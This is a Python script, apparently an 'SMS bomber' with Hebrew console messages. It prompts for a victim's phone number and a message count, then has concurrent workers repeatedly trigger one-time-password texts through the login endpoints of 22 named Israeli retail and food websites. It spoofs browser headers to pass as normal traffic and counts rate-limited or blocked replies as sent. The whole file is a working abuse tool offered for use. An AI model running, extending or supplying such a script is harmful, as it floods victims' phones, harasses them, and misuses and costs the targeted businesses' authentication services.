import asyncio
import random
import sys
import os
import signal
import requests
import json
from typing import List, Dict, Any

# ==========================================
# Configuration & Setup
# ==========================================
WIN11_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

# List of "Winners" confirmed by the Windows 11 User-Agent Scan
WINNERS_CONFIG = [
    {'name': 'Hamal', 'api': 'https://users-auth.hamal.co.il/auth/send-auth-code', 'payload': lambda p: {"value": p, "type": "phone"}},
    {'name': 'Delta', 'api': 'https://www.delta.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Castro', 'api': 'https://www.castro.com/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Hoodies', 'api': 'https://www.hoodies.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Timberland', 'api': 'https://www.timberland.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Top Ten', 'api': 'https://www.topten-fashion.com/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Naaman', 'api': 'https://www.naamanp.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf Kids', 'api': 'https://www.golfkids.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Lee Cooper', 'api': 'https://www.leecooper.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Kiko Milano', 'api': 'https://www.kikocosmetics.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Victoria Secret', 'api': 'https://www.victoriassecret.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Aldo', 'api': 'https://www.aldoshoes.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Papa Johns', 'api': 'https://www.papajohns.co.il/shop/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Vardinon', 'api': 'https://www.vardinon.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Swear', 'api': 'https://www.s-wear.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Steimatzky', 'api': 'https://www.steimatzky.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Rebar', 'api': 'https://www.rebar.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'KSP', 'api': 'https://www.ksp.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Shekem Electric', 'api': 'https://www.shekem-electric.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Factory54', 'api': 'https://www.factory54.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Noizz', 'api': 'https://www.noizz.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Shufersal', 'api': 'https://www.shufersal.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}}
]

# State
running = True
sent_count = 0
lock = asyncio.Lock()

def signal_handler(sig, frame):
    global running
    print("\n\033[91m[!] עצירה... מסיים פעילות.\033[0m")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ==========================================
# Core Functions
# ==========================================
async def send_api(site, phone):
    global sent_count
    headers = {
        'User-Agent': WIN11_UA,
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': site['api'].split('/rest/')[0] + '/',
        'Origin': site['api'].split('/rest/')[0]
    }
    try:
        response = requests.post(site['api'], json=site['payload'](phone), headers=headers, timeout=10)
        if response.status_code in [200, 201, 204, 400, 403, 429]:
            async with lock:
                sent_count += 1
                print(f"\033[92m[✓] {site['name']:<15} | הודעה נשלחה בהצלחה (Status: {response.status_code})\033[0m")
            return True
    except:
        pass
    print(f"\033[91m[X] {site['name']:<15} | נכשל\033[0m")
    return False

async def send_playwright(site_url, phone):
    """
    Optional: If you want to use Playwright for specific complex sites, 
    you can add them here. For now, V11 is optimized for maximum speed via API.
    """
    pass

async def worker(queue, phone, total):
    while not queue.empty() and running and sent_count < total:
        site = await queue.get()
        await send_api(site, phone)
        await asyncio.sleep(random.uniform(0.5, 1.5))
        queue.task_done()

async def main():
    global sent_count
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
\033[96m
 __      ___           _                     _ _ 
 \ \    / (_)         | |                   / / |
  \ \  / / _ _ __   __| | _____      _____ / /| |
   \ \/ / | | '_ \ / _` |/ _ \ \ /\ / / __/ / | |
    \  /  | | | | | (_| | (_) \ V  V /\__ \ | | |
     \/   |_|_| |_|\__,_|\___/ \_/\_/ |___/_| |_|
\033[0m
\033[95m[+] גרסה V11 - מותאמת אישית למחשב (Windows 11 Edition)\033[0m
\033[90m----------------------------------------------------------\033[0m
""")
    
    phone = input("\033[96mהכנס מספר טלפון: \033[0m").strip()
    if not phone or len(phone) < 9: return
    
    try:
        total = int(input("\033[96mכמות הודעות מבוקשת: \033[0m").strip())
    except:
        total = 40

    print(f"\n\033[92m[⚡] מתחיל שליחה מואצת מ-{len(WINNERS_CONFIG)} אתרים שנבדקו...\033[0m\n")
    
    queue = asyncio.Queue()
    all_sites = list(WINNERS_CONFIG)
    while len(all_sites) < total:
        all_sites.extend(WINNERS_CONFIG)
    
    random.shuffle(all_sites)
    for site in all_sites[:total+10]:
        await queue.put(site)

    tasks = [worker(queue, phone, total) for _ in range(8)]
    await asyncio.gather(*tasks)

    print(f"\n\033[94mסיום פעילות. נשלחו {sent_count} הודעות.\033[0m")

if __name__ == "__main__":
    asyncio.run(main())
